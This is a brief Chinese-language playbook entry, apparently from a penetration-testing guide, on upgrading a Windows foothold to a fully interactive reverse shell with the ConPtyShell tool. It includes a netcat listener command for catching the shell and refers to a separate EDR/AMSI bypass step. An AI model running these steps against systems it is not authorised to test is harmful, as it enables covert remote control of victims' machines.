# Windows ConPTY / Interactive Session Upgrade

## 1. ConPTY 条件

Windows 10/Server 2019 及以后通常具备 Pseudo Console API；具体可用性仍取决于 build 和当前进程环境。

## 2. ConPtyShell

官方项目用于把普通 channel 升级为 fully interactive Windows reverse shell。

```bash
git clone https://github.com/antonioCoco/ConPtyShell.git
```

本地 listener 可按官方建议设置 raw TTY：

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

然后通过**已经存在的 Windows command execution**调用 `Invoke-ConPtyShell.ps1` 的对应参数。

如果脚本被 AMSI/EDR 阻断，不在这里复制 AMSI bypass；人工选择 `/edr-bypass`，解决后回来继续 session upgrade。

## 3. 成功判断

```text
PowerShell/cmd prompt stable
arrow keys/history usable where supported
Ctrl-C behavior correct
full-screen/interactive programs behave normally
```
